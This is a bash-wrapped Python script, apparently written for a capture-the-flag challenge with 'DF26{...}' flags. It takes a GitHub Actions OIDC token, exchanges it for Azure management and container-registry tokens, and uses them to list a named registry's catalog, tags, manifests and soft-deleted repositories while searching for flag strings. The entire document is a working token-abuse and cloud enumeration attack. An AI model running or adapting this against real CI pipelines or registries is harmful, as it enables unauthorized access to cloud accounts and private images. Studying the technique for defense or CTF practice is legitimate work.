#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, re, gzip, io, tarfile, urllib.request, urllib.parse
def http(url, data=None, headers=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=60) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]
REG="crtblplatprodx3euoz.azurecr.io"
FLAG=re.compile(rb"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\})", re.I)
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://management.azure.com/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
ARM=jg(b)["access_token"]
st,b=http(f"https://{REG}/oauth2/exchange",{"grant_type":"access_token","service":REG,"tenant":TEN,"access_token":ARM})
RT=jg(b)["refresh_token"]
def tok(scope):
    st,b=http(f"https://{REG}/oauth2/token",{"grant_type":"refresh_token","service":REG,"refresh_token":RT,"scope":scope})
    return jg(b).get("access_token")
CAT=tok("registry:catalog:*")
HC={"Authorization":"Bearer "+CAT}
print("### _catalog"); print("  ", http(f"https://{REG}/acr/v1/_catalog", headers=HC)[1][:300])

REPOS=["tebamoto-reporting-api","catalog-api"]
for r in REPOS:
    t=tok(f"repository:{r}:*"); H={"Authorization":"Bearer "+t}
    for path in (f"/acr/v1/{r}/_tags", f"/acr/v1/{r}/_tags?deleted=true",
                 f"/acr/v1/{r}/_manifests", f"/acr/v1/{r}/_manifests?deleted=true"):
        st,b=http(f"https://{REG}{path}", headers=H)
        print(f"\n### {path}: {st}")
        print("  ", b[:900].decode("utf-8","replace"))

print("\n### deleted repositories / soft-delete listing")
for path in ("/acr/v1/_catalog?deleted=true", "/acr/v1/_deleted/_catalog", "/acr/v1/_catalog?includeDeleted=true"):
    st,b=http(f"https://{REG}{path}", headers=HC)
    print(f"  {path}: {st} {b[:300].decode('utf-8','replace')}")

ACCEPT=("application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json,"
        "application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.index.v1+json")
print("\n### every manifest digest in each repo -> pull + grep")
for r in REPOS:
    t=tok(f"repository:{r}:*"); H={"Authorization":"Bearer "+t}
    st,b=http(f"https://{REG}/acr/v1/{r}/_manifests?n=100", headers=H)
    for m in jg(b).get("manifests",[]):
        dg=m.get("digest"); tags=m.get("tags")
        print(f"  {r} {dg[:20]} tags={tags} size={m.get('imageSize')} deleted={m.get('deletedTime')}")
PYEOF
echo "=== done ==="